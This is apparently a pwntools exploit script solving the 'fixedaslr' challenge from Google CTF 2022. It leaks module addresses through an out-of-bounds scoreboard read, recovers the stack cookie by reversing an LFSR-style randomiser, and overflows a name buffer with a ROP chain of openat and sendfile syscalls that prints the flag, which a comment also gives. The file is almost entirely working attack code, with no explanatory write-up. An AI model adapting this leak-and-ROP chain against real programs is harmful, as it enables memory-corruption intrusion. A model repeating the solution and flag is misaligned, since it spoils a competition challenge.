#!/usr/bin/env python3
from pwn import *
import struct
import sys

BIT63 = 63
BIT62 = 62
BIT61 = 61
BIT60 = 60
BIT59 = 59
BIT58 = 58

p = remote("fixedaslr.2022.ctfcompetition.com", 1337)
# p = process("./loader")
# elf = ELF("loader")
# gdb.attach(p, """
# b *0x00000000004017a2
# command 1
# p/x $rax
# c
# end
# c
# """)
# p = gdb.debug("./loader", """
# b *0x00000000004017a2
# command 1
# p/x $rax
# c
# end
# r
# c
# """)

# Constants
STACK_ADDR = 0x7ffffffff000
STACK_SIZE = 23 * 4096
OVERFLOW = 0x10000000000000000

# Offsets to gadgets in "debug.o" / "syscall.o"
debug_pop_rdi_retn_offset = 0x1 + 0x1000
debug_pop_rsi_retn_offset = 0x4  + 0x1000
debug_pop_rdx_retn_offset = 0x10  + 0x1000
debug_pop_r10_retn_offset = 0x21  + 0x1000
debug_pop_rax_retn_offset = 0x7  + 0x1000
syscall_syscall_retn_offset = 0xA  + 0x1000


def wait_for_choice(p):
    p.recvuntil(b"Your choice?\n")

def get_scoreboard_leak(p, offset):
    wait_for_choice(p)
    p.sendline(b"3")
    print(p.recvuntil(b"?\n"))
    p.sendline(f"{offset}".encode())
    p.recvuntil(b"To get this place you need to beat this score: ")
    leak_int = p.recvuntil(b"\n")
    print(leak_int)
    return int(leak_int)


def win_quiz(p, win=True):
    x = 20 if win else 12
    wait_for_choice(p)
    p.sendline(b"1")
    for i in range(x):
        print(p.recvuntil(b"is "))
        quiz_list = p.recvuntil(b" ?\n").replace(b" ?\n", b"").split(b" + ")
        answer = int(quiz_list[0]) + int(quiz_list[1])
        p.sendline(f"{answer}".encode())

    print(p.recvuntil(b"is "))
    quiz_list = p.recvuntil(b" ?\n").replace(b" ?\n", b"").split(b" + ")
    answer = int(quiz_list[0]) + int(quiz_list[1])
    p.sendline(f"{answer+1}".encode())
    print(p.recvuntil(b"31)?\n"))


def get_prev_byte(val):
    bit = 0
    bit = ((val >> BIT62) & 1) ^ ((val >> BIT61) & 1) ^ ((val >> BIT59) & 1) ^ (val & 1) ^ 1
    return bit

def get_next_byte(val):
    bit = 0
    bit = ((val >> BIT63) & 1) ^ ((val >> BIT61) & 1) ^ ((val >> BIT60) & 1) ^ ((val >> BIT58) & 1) ^ 1
    return bit

def main():
    
    base_scoreboard_table = get_scoreboard_leak(p, 512) - 0x60
    base_main_o = (base_scoreboard_table >> 28) << 28
    base_game_o = (get_scoreboard_leak(p, OVERFLOW - 1023) >> 28) << 28
    base_guard_o = (get_scoreboard_leak(p, OVERFLOW - 1017) >> 28) << 28
    offset_to_basic_o = OVERFLOW + int((-base_scoreboard_table + base_game_o)/8 + 1)
    base_basic_o = (get_scoreboard_leak(p, offset_to_basic_o) >> 28) << 28
    offset_to_res = OVERFLOW + int((-base_scoreboard_table + base_game_o)/8 + 1024)
    base_res_o = (get_scoreboard_leak(p, offset_to_res) >> 28) << 28
    offset_to_sys = OVERFLOW + int((-base_scoreboard_table + base_guard_o)/8 + 1)
    base_sys_o = (get_scoreboard_leak(p, offset_to_sys) >> 28) << 28
    # base_syscalls_o = (get_scoreboard_leak(p, OVERFLOW - 1023) >> 28) << 28
    # offset_to_read = (STACK_ADDR - base_scoreboard_table) // 8

    print(hex(base_scoreboard_table))
    print(hex(base_main_o))
    print(hex(base_game_o))
    print(hex(base_guard_o))
    print(hex(base_basic_o))
    print(hex(base_res_o))
    print(hex(base_sys_o))

    randstate = (base_main_o >> 28)
    randstate = randstate << 12 | (base_sys_o >> 28)
    randstate = randstate << 12 | (base_guard_o >> 28)
    randstate = randstate << 12 | (base_basic_o >> 28)
    randstate = randstate << 12 | (base_game_o >> 28)
    randstate = randstate << 4 | (base_res_o >> 36)

    cookie = randstate
    for i in range(64):
        bit = get_prev_byte(cookie)
        cookie = (cookie >> 1) | (bit << BIT63)

    base_debug_o = randstate
    for i in range(20):
        bit = get_next_byte(base_debug_o)
        base_debug_o = (base_debug_o << 1) | (bit)

    base_debug_o = (base_debug_o & 0xfff) << 28
    print(f"debug.o base: {hex(base_debug_o)}")
    print(f"Cookie: {hex(cookie)}")

    win_quiz(p, win=True)

    p.sendline(b"5")

    print(p.recvuntil(b"name:\n"))

    buf = b'flag' + b'\x00'

    p.sendline(buf)

    win_quiz(p, False)

    buf = b'a' * 0x28
    buf += struct.pack('<Q',cookie)

    buf += p64(0xdeadbeef) # dummy rbp

    ## ROP
    # openat(AT_FDCWD, "flag", O_RDONLY)
    buf += p64(base_debug_o + debug_pop_rdi_retn_offset)
    buf += p64(OVERFLOW-100)    # AT_FDCWD
    buf += p64(base_debug_o + debug_pop_rsi_retn_offset)
    buf += p64(base_scoreboard_table + 0x60)    # Flag string
    buf += p64(base_debug_o + debug_pop_rdx_retn_offset)
    buf += p64(0) # O_RDONLY
    buf += p64(base_debug_o + debug_pop_rax_retn_offset)
    buf += p64(257)  # __NR_openat
    buf += p64(base_sys_o + syscall_syscall_retn_offset)

    # sendfile(1, 3, NULL, 50)
    buf += p64(base_debug_o + debug_pop_rdi_retn_offset)
    buf += p64(1)    # stdout
    buf += p64(base_debug_o + debug_pop_rsi_retn_offset)
    buf += p64(3)    # 
    buf += p64(base_debug_o + debug_pop_rdx_retn_offset)
    buf += p64(0) # NULL
    buf += p64(base_debug_o + debug_pop_r10_retn_offset)
    buf += p64(50) # flag length
    buf += p64(base_debug_o + debug_pop_rax_retn_offset)
    buf += p64(40)  # __NR_sendfile
    buf += p64(base_sys_o + syscall_syscall_retn_offset)

    # Bye-bye
    buf += p64(0xdeadbeef)

    p.sendline(f"{len(buf)}".encode())

    print(p.recvuntil(b"name:\n"))

    # Send the stack-overflow
    p.sendline(buf)

    # Get the flag! (which is "CTF{GuessYouCanSayTheCookieGotRandomlyBroken}")
    p.interactive()

if __name__ == "__main__":
    main()
